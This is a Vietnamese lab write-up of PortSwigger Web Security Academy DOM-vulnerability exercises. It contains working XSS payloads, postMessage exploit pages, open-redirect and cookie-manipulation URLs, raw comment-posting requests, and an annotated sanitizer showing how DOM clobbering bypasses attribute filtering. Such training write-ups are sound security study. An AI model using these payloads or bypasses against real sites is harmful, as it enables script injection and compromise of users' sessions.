# DOM-based vulnerabilities

## **Lab: DOM XSS using web messages**

[Lab: DOM XSS using web messages | Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

- Thực hiện dùng `ffuf` để fuzzing web. Nhận thấy có path `filter` chứa đoạn js dùng `innerHTML`
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image.png)
        
        ![image.png](DOM-based%20vulnerabilities/image%201.png)
        
- Để có thể truyền giá trị vào param `message` cần phải dùng `postMessage` từ một trang nhúng hoặc popup chứa trang có sink trên.
- Trong exploit server, tạo trang như sau:
    - Exploit server
        - Head
            
            ```html
            HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8
            ```
            
        - Body
            
            ```html
            <iframe id="abc" src="<url-lab>/filter" style="width:1000px; height:1000px"></iframe>
            <script>
            const abc = document.getElementById("abc");
            abc.onload=()=>{abc.contentWindow.postMessage("<img src=x onerror=print()>","<url-lab>");}
            </script>
            ```
            
- Thực hiện `View exploit` . Quan sát thấy print thành công
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%202.png)
        
- Thực hiện `Deliver to victim` . Hoàn thành giải lab
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%203.png)
        

## **Lab: DOM XSS using web messages and a JavaScript URL**

[Lab: DOM XSS using web messages and a JavaScript URL | Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

- Thực hiện view source tại trang chủ. Nhận thấy có đoạn js sau chứa sink nguy hiểm
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%204.png)
        
- Để có thể truyền giá trị vào param `message` cần phải dùng `postMessage` từ một trang nhúng hoặc popup chứa trang có sink trên.
- Quan sát rằng đoạn js này sẽ gọi đến một url ⇒ có thể dùng `javascript` protocol để gọi mã js. Tuy nhiên, code đã có phần kiểm tra buộc url phải có `http` hoặc `https` ⇒ có thể thêm một đoạn comment để qua đoạn kiểm tra này. Điều hướng đến exploit server.
- Trong exploit server, tạo trang như sau:
    - Exploit server
        - Head
            
            ```html
            HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8
            ```
            
        - Body
            
            ```html
            <iframe id="abc" src="<url-lab>" style="width:1000px; height:1000px"></iframe>
            <script>
            const abc = document.getElementById("abc");
            abc.onload=()=>{abc.contentWindow.postMessage("javascript:print()//http:","<url-lab>");}
            </script>
            ```
            
- Thực hiện `View exploit` và quan sát thấy rằng đã thực hiện print thành công trên trang có lỗ hổng
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%205.png)
        
- Thực hiện `Deliver to victim` và quan sát thấy giải lab thành công
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%206.png)
        

## **Lab: DOM XSS using web messages and `JSON.parse`**

[Lab: DOM XSS using web messages and JSON.parse | Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

- Tại trang chủ, thực hiện view page source. Tại đây, quan sát thấy có một đoạn code js nhận message gửi đến và có một option đẩy url được `JSON.parse` từ message và đẩy vào mà không qua hàm kiểm tra nào
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%207.png)
        
- Như vậy, chúng ta có thể truyền url tùy ý vào iframe bằng cách gửi một message với `type:load-chanel` và `url:<url>`
- Điều hướng đến Exploit server và tạo một trang chứa trang web có vuln đồng thời viết thêm đoạn script gửi message như sau:
    - Exploit server
        - Head
            
            ```bash
            HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8
            ```
            
        - Body
            
            ```bash
            <iframe id="abc" src="<url-lab>"></iframe>
            <script>
            const abc = document.getElementById("abc");
            abc.onload = ()=>{
            abc.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","<url-lab>");
            };
            </script>
            ```
            
- Thực hiện view exploit và quan sát thấy print thành công
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%208.png)
        
- Thực hiện `Deliver to victim` và hoàn thành solve lab
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%209.png)
        

## **Lab: DOM-based open redirection**

[Lab: DOM-based open redirection | Web Security Academy](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

- Thực hiện view một post bất kỳ. Quan sát source code nhận thấy tại nút `Back to Blog` nhận url mà user có thể kiểm soát mà không có kiểm tra ⇒ Open redirect
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2010.png)
        
- Thực hiện thêm query trên url như sau:
    - URL
        
        ```html
        <url-lab>/post?postId=2&url=<url-exploit-server>
        ```
        
- Điều hướng đến url trên. Quan sát thấy hoàn thành giải lab
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2011.png)
        

## **Lab: DOM-based cookie manipulation**

[Lab: DOM-based cookie manipulation | Web Security Academy](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

- Thực hiện xem một sản phẩm bất kỳ. Tại đây, trang hiển thị một sản phẩm thực hiện viewsource và thấy có đoạn js lấy `window.location` gắn vào cookie với name là `lastViewedProduct` . Sau đó, code thực hiện lấy giá trị này trong cookie và đẩy vào `href` attribute của thẻ `<a>`
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2012.png)
        
        ![image.png](DOM-based%20vulnerabilities/image%2013.png)
        
        ![image.png](DOM-based%20vulnerabilities/image%2014.png)
        
- Như vậy, chúng ta có thể thực hiện escape ra khỏi thuộc tính và chèn code tùy ý như sau:
    - URL
        
        ```bash
        <url-lab>/product?productId=3#'%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C
        ```
        
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2015.png)
        
- Thực hiện gửi URL cho victim bằng exploit server. Quan sát solve lab thành công
    - Exploit server config
        - Head
            
            ```bash
            HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8
            ```
            
        - Body
            
            ```bash
            <script>
            location="<url-lab>/product?productId=3#'%3E%3Cimg%20src=x%20onerror=print()%3E%3C";
            </script>
            ```
            
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2016.png)
        

## **Lab: Exploiting DOM clobbering to enable XSS**

[Lab: Exploiting DOM clobbering to enable XSS | Web Security Academy](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)

- Thực hiện xem một bài post bất kỳ. Tại đây, quan sát thấy có một lưu ý là cho phép HTML
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2017.png)
        
- Khi thực hiện comment với payload sau thì handler event đã bị bỏ
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2018.png)
        
- Cơ chế bỏ handler event là nhờ code client side dùng DOMpurify.sanitize để bỏ các attribute của môt tag có hại như handler event.
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2019.png)
        
- Tuy nhiên, code chỉ thực hiện sanitize author, body của comment mà không validate avatar của comment đồng thời nối trực tiếp vào source `innerHTML`
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2020.png)
        
- Dù vậy, code be đã ngăn mass asignment nên chúng ta không thể thay đổi trường avatar bằng cách này.
- Khi quan sát kỹ chúng ta thấy rằng code sẽ lấy default url nếu không có url của user gửi bằng cách truy cập vào `window.defaultAvatar`
- Để thao túng được giá trị `window.defaultAvatar` chúng ta có thể ghi đè bằng cách thêm hai thẻ cùng `id` và nhờ vậy thì js sẽ hiểu đây là collection và sẽ chọn cái có name là avatar. Ví dụ, khi chúng ta truyền payload sau thì sẽ nối chuỗi thành công vào avatar (kiểm soát được `window.defaultAvatar`
    - Payload
        
        ```html
        <a id=defaultAvatar><a id=defaultAvatar name=avatar href=a"onerror=alert(1)>
        ```
        
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2021.png)
        
- Tuy nhiên thì ở đây, các ký tự là `"`  và space bị url encode do thuộc tính href của a khi lấy ra nên sẽ bị encode, trừ khi chúng ta thay href này là một scheme khác như `cid` thì sẽ được. Như vậy, chúng ta thử như sau
    - Payload
        
        ```html
        <a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:a"onerror=alert(1)//"'>
        ```
        
    - Request
        
        ```html
        POST /post/comment HTTP/2
        Host: 0a4000b104c641da808a1cc500a3003b.web-security-academy.net
        Cookie: session=gxIEMspJOUYmDzIynaSJkAJHZxAROYsR
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 275
        
        csrf=ClaCjl2PnanlJtXgUq7CCbT9Mn7Cm4we&postId=9&comment=%3ca%20id%3ddefaultAvatar%3e%3ca%20id%3ddefaultAvatar%20name%3davatar%20href%3d'cid%3aa%22onerror%3dalert(1)%2f%2f%22'%3e&name=%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&email=a%40a.com&website=http%3A%2F%2Fac.com
        ```
        
    - Response
        
        ![image.png](DOM-based%20vulnerabilities/image%2022.png)
        
- Thực hiện truy cập bài post có comment trên. Quan sát thấy alert thành công, hoàn thành giải lab
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2023.png)
        
        ![image.png](DOM-based%20vulnerabilities/image%2024.png)
        

## **Lab: Clobbering DOM attributes to bypass HTML filters**

[Lab: Clobbering DOM attributes to bypass HTML filters | Web Security Academy](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

- Thực hiện chọn một post bất kỳ. Tại đây, thực hiện view page source và quan sát thấy khi client code nhận data từ response, sẽ đưa qua hàm sanitize các attributes không hợp lệ đối với các thẻ. Chính vì vậy, khi truyền payload ví dụ `'"><img src=x onerror=alert(1)>` thì toàn bộ thẻ img sẽ bị bỏ vì chứ onerror.
    - POC
        
        ```bash
        (function (root, factory) {
          // Universal Module Definition:
          // Nếu môi trường hỗ trợ AMD thì define module theo kiểu AMD.
          if (typeof define === 'function' && define.amd) {
            define('html-janitor', factory);
        
          // Nếu chạy trong Node/CommonJS thì export bằng module.exports.
          } else if (typeof exports === 'object') {
            module.exports = factory();
        
          // Nếu chạy trực tiếp trên browser thì gắn HTMLJanitor vào object global.
          } else {
            root.HTMLJanitor = factory();
          }
        
        }(this, function () {
        
          /**
           * Hàm khởi tạo HTMLJanitor.
           *
           * @param {Object} config.tags
           * Dictionary chứa danh sách tag được cho phép.
           *
           * Ví dụ:
           * {
           *   tags: {
           *     a: { href: true },
           *     b: true,
           *     script: false
           *   }
           * }
           *
           * @param {boolean} config.keepNestedBlockElements
           * Mặc định false. Điều khiển việc có giữ block element lồng nhau hay không.
           */
          function HTMLJanitor(config) {
        
            // Lấy danh sách rule cho từng tag từ config.
            var tagDefinitions = config['tags'];
        
            // Lấy tên các tag được khai báo trong config.
            var tags = Object.keys(tagDefinitions);
        
            // Kiểm tra từng giá trị trong config.tags.
            // Mỗi tag chỉ được nhận rule dạng:
            // - object: cấu hình attribute chi tiết
            // - boolean: true/false cho phép hoặc chặn tag
            // - function: hàm tự quyết định attribute được phép
            var validConfigValues = tags
              .map(function(k) { return typeof tagDefinitions[k]; })
              .every(function(type) {
                return type === 'object' || type === 'boolean' || type === 'function';
              });
        
            // Nếu config sai format thì throw lỗi.
            if(!validConfigValues) {
              throw new Error("The configuration was invalid");
            }
        
            // Lưu config vào instance để dùng trong quá trình sanitize.
            this.config = config;
          }
        
          // Danh sách các block element.
          // Dùng để xử lý logic block lồng block hoặc whitespace quanh block.
          var blockElementNames = [
            'P', 'LI', 'TD', 'TH', 'DIV',
            'H1', 'H2', 'H3', 'H4', 'H5', 'H6',
            'PRE'
          ];
        
          function isBlockElement(node) {
            // nodeName thường là uppercase trong DOM, ví dụ "DIV", "P".
            return blockElementNames.indexOf(node.nodeName) !== -1;
          }
        
          // Danh sách inline element.
          var inlineElementNames = [
            'A', 'B', 'STRONG', 'I', 'EM',
            'SUB', 'SUP', 'U', 'STRIKE'
          ];
        
          function isInlineElement(node) {
            return inlineElementNames.indexOf(node.nodeName) !== -1;
          }
        
          HTMLJanitor.prototype.clean = function (html) {
            // Tạo một document sandbox riêng để parse HTML.
            // Mục đích: không nhét thẳng HTML vào document thật.
            const sandbox = document.implementation.createHTMLDocument('');
        
            // Tạo div làm root container.
            const root = sandbox.createElement("div");
        
            // Parse chuỗi HTML đầu vào thành DOM node bên trong root.
            root.innerHTML = html;
        
            // Bắt đầu sanitize từ root.
            this._sanitize(sandbox, root);
        
            // Trả lại HTML sau khi đã lọc.
            return root.innerHTML;
          };
        
          HTMLJanitor.prototype._sanitize = function (document, parentNode) {
            // Tạo TreeWalker để duyệt qua text node, element node và comment node.
            var treeWalker = createTreeWalker(document, parentNode);
        
            // Lấy child đầu tiên của parentNode.
            var node = treeWalker.firstChild();
        
            // Nếu parentNode không có con thì dừng.
            if (!node) { return; }
        
            do {
              // Nếu là text node.
              if (node.nodeType === Node.TEXT_NODE) {
        
                // Nếu text node chỉ toàn whitespace và nằm cạnh block element,
                // thì remove nó.
                //
                // Đây là heuristic để xử lý bug liên quan contenteditable trên Firefox.
                if (
                  node.data.trim() === ''
                  && (
                    (node.previousElementSibling && isBlockElement(node.previousElementSibling))
                    || (node.nextElementSibling && isBlockElement(node.nextElementSibling))
                  )
                ) {
                  parentNode.removeChild(node);
        
                  // Sau khi DOM thay đổi, gọi lại _sanitize từ parentNode.
                  // Vì treeWalker cũ có thể không còn phản ánh DOM mới chính xác.
                  this._sanitize(document, parentNode);
                  break;
                } else {
                  // Text bình thường thì giữ lại.
                  continue;
                }
              }
        
              // Nếu là comment node thì xóa.
              if (node.nodeType === Node.COMMENT_NODE) {
                parentNode.removeChild(node);
        
                // DOM đã thay đổi nên sanitize lại parent.
                this._sanitize(document, parentNode);
                break;
              }
        
              // Kiểm tra node hiện tại có phải inline element không.
              var isInline = isInlineElement(node);
        
              var containsBlockElement;
        
              if (isInline) {
                // Nếu inline element chứa block element bên trong,
                // ví dụ <a><div>...</div></a>,
                // thì markup bị xem là invalid.
                containsBlockElement = Array.prototype.some.call(
                  node.childNodes,
                  isBlockElement
                );
              }
        
              // Kiểm tra trường hợp block element bị lồng trong block element.
              // Ví dụ <li><p>abc</p></li>.
              var isNotTopContainer = !! parentNode.parentNode;
        
              var isNestedBlockElement =
                    isBlockElement(parentNode)
                    && isBlockElement(node)
                    && isNotTopContainer;
        
              // Lấy tên tag dạng lowercase.
              // Ví dụ nodeName "FORM" thành "form".
              var nodeName = node.nodeName.toLowerCase();
        
              // Lấy danh sách attribute được phép cho tag hiện tại.
              // Đây có thể là:
              // - undefined: tag không được phép
              // - boolean
              // - object chứa rule attribute
              // - function trả về rule
              var allowedAttrs = getAllowedAttrs(this.config, nodeName, node);
        
              // Inline chứa block thì bị xem là invalid.
              var isInvalid = isInline && containsBlockElement;
        
              // Nếu node không hợp lệ, không nằm trong whitelist,
              // hoặc là block element lồng nhau không được phép,
              // thì xóa tag này.
              if (
                isInvalid
                || shouldRejectNode(node, allowedAttrs)
                || (!this.config.keepNestedBlockElements && isNestedBlockElement)
              ) {
                // Với SCRIPT/STYLE thì xóa luôn cả nội dung bên trong.
                // Vì giữ lại text trong script/style có thể nguy hiểm hoặc vô nghĩa.
                if (!(node.nodeName === 'SCRIPT' || node.nodeName === 'STYLE')) {
        
                  // Với tag thường, unwrap node:
                  // đưa toàn bộ child của node lên trước node hiện tại.
                  //
                  // Ví dụ:
                  // <bad><b>Hello</b></bad>
                  //
                  // Sau khi unwrap:
                  // <b>Hello</b>
                  while (node.childNodes.length > 0) {
                    parentNode.insertBefore(node.childNodes[0], node);
                  }
                }
        
                // Xóa node hiện tại khỏi DOM.
                parentNode.removeChild(node);
        
                // DOM thay đổi nên sanitize lại parent.
                this._sanitize(document, parentNode);
                break;
              }
        
              // ==========================
              // PHẦN QUAN TRỌNG NHẤT
              // Sanitize attributes
              // ==========================
        
              // Duyệt qua toàn bộ attribute của node.
              //
              // Ví dụ:
              // <form onclick="alert(1)" action="/x">
              //
              // node.attributes thường là NamedNodeMap gồm:
              // - onclick
              // - action
              //
              // Nếu onclick không được whitelist thì sẽ bị remove.
              //
              // Nhưng trong DOM clobbering, attacker có thể làm:
              //
              // <form onclick=alert(1)>
              //   <input id=attributes>
              // </form>
              //
              // Một số DOM property có thể bị clobber bởi phần tử con có id/name
              // tương ứng. Khi đó node.attributes có thể không còn trỏ đến
              // danh sách attribute thật nữa.
              //
              // Nếu node.attributes bị clobber thành input element,
              // thì node.attributes.length có thể là undefined.
              //
              // Khi đó điều kiện:
              // a < node.attributes.length
              //
              // sẽ không chạy đúng, khiến vòng lặp bỏ qua việc kiểm tra attribute.
              // Kết quả: onclick có thể không bị xóa.
              for (var a = 0; a < node.attributes.length; a += 1) {
                var attr = node.attributes[a];
        
                // Kiểm tra attribute hiện tại có nên bị xóa không.
                if (shouldRejectAttr(attr, allowedAttrs, node)) {
                  // Xóa attribute khỏi node.
                  node.removeAttribute(attr.name);
        
                  // Vì node.attributes là live collection,
                  // khi xóa một attribute thì các phần tử phía sau bị dồn index.
                  //
                  // Ví dụ attributes:
                  // [0] onclick
                  // [1] href
                  //
                  // Xóa onclick xong thì href dồn về index 0.
                  // Nếu không a-- thì vòng lặp sẽ nhảy qua href.
                  a = a - 1;
                }
              }
        
              // Sau khi xử lý attribute của node hiện tại,
              // tiếp tục sanitize các node con bên trong nó.
              this._sanitize(document, node);
        
            // Chuyển sang sibling tiếp theo.
            } while ((node = treeWalker.nextSibling()));
          };
        
          function createTreeWalker(document, node) {
            // TreeWalker giúp duyệt DOM theo node type được chọn.
            //
            // Ở đây nó duyệt:
            // - Text node
            // - Element node
            // - Comment node
            return document.createTreeWalker(
              node,
              NodeFilter.SHOW_TEXT | NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT,
              null,
              false
            );
          }
        
          function getAllowedAttrs(config, nodeName, node) {
            // Nếu rule của tag là function thì gọi function đó.
            // Function có thể quyết định attribute được phép dựa trên node hiện tại.
            if (typeof config.tags[nodeName] === 'function') {
              return config.tags[nodeName](node);
        
            // Nếu không thì lấy rule trực tiếp từ config.
            } else {
              return config.tags[nodeName];
            }
          }
        
          function shouldRejectNode(node, allowedAttrs) {
            // Nếu allowedAttrs là undefined,
            // nghĩa là tag này không tồn tại trong whitelist.
            // => reject node.
            if (typeof allowedAttrs === 'undefined') {
              return true;
        
            // Nếu allowedAttrs là boolean:
            // true  => cho phép tag
            // false => reject tag
            } else if (typeof allowedAttrs === 'boolean') {
              return !allowedAttrs;
            }
        
            // Nếu allowedAttrs là object hoặc function trả về object,
            // thì tag được giữ lại, attribute sẽ kiểm tra sau.
            return false;
          }
        
          function shouldRejectAttr(attr, allowedAttrs, node) {
            // Normalize tên attribute về lowercase.
            // Ví dụ "ONCLICK" thành "onclick".
            var attrName = attr.name.toLowerCase();
        
            // Nếu allowedAttrs === true:
            // cho phép tất cả attribute của tag này.
            if (allowedAttrs === true) {
              return false;
        
            // Nếu rule của attribute là function:
            // gọi function để kiểm tra value.
            //
            // Nếu function trả false thì reject attribute.
            } else if (typeof allowedAttrs[attrName] === 'function') {
              return !allowedAttrs[attrName](attr.value, node);
        
            // Nếu attribute không xuất hiện trong whitelist:
            // reject.
            } else if (typeof allowedAttrs[attrName] === 'undefined') {
              return true;
        
            // Nếu attribute được set explicitly là false:
            // reject.
            } else if (allowedAttrs[attrName] === false) {
              return true;
        
            // Nếu rule là string:
            // chỉ cho phép attribute nếu value khớp chính xác string đó.
            //
            // Ví dụ:
            // {
            //   target: "_blank"
            // }
            //
            // thì target chỉ được giữ nếu attr.value === "_blank".
            } else if (typeof allowedAttrs[attrName] === 'string') {
              return (allowedAttrs[attrName] !== attr.value);
            }
        
            // Các trường hợp còn lại thì không reject.
            return false;
          }
        
          // Trả constructor HTMLJanitor ra ngoài factory.
          return HTMLJanitor;
        
        }));
        ```
        
        ![image.png](DOM-based%20vulnerabilities/image%2025.png)
        
        ![image.png](DOM-based%20vulnerabilities/image%2026.png)
        
        ![image.png](DOM-based%20vulnerabilities/image%2027.png)
        
- Tuy nhiên, nếu như chúng ta có thể ghi đè `attributes` của một node bằng cách tạo một thẻ con có id là `attributes` thì khi đó `node.attributes` sẽ trả về thẻ con đó nên khi lấy length sẽ là undefined ⇒ loop không vào được ⇒ không sanitize nữa.
- Thực hiện dùng thẻ `form` với `input` là con như sau để ghi đè. Ngoài ra vì bài cần auto nên cần thêm focus. Do form mặc định không focus được nên cần thêm tabindex
    - Payload
        
        ```bash
        <form id="xyz"  tabindex=0 onfocus=print()><input id=attributes></form>
        ```
        
    - Thực hiện gửi request
        
        ```bash
        POST /post/comment HTTP/2
        Host: 0a3400ca032176df80380323007c000a.web-security-academy.net
        Cookie: session=lxqe29PYhv0EQYREM45bXVb1ZqIbJ3Pm
        Content-Length: 260
        Content-Type: application/x-www-form-urlencoded
        
        csrf=Befz2s4NEYkjKsOemqDEx79my9GM3WQE&postId=1&comment=%3cform%20id%3d%22xyz%22%20%20tabindex%3d0%20onfocus%3dprint()%3e%3cinput%20id%3dattributes%3e%3c%2fform%3e&name=%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&email=a%40a.com&website=http%3A%2F%2Fa.com
        ```
        
- Điều hướng đến bài post vừa comment, nhấn vào `Click me!` comment vừa rồi và print thành công
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2028.png)
        
- Thực hiện gửi request sau để victim truy cập vào trang có sẵn payload của chúng ta bằng exploit server
    - Exploit
        - Head
            
            ```bash
            HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8
            ```
            
        - Body
            
            ```bash
            <iframe
              src="https://0a3400ca032176df80380323007c000a.web-security-academy.net/post?postId=1"
              style="width:1000px;height:1000px"
              onload="this.src=this.src+'#xyz'">
            </iframe>
            ```
            
- Thực hiện view exploit nhận thấy print được auto gọi
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2029.png)
        
- Thực hiện deliver to victim, quan sát thấy solve lab thành công
    - POC
        
        ![image.png](DOM-based%20vulnerabilities/image%2030.png)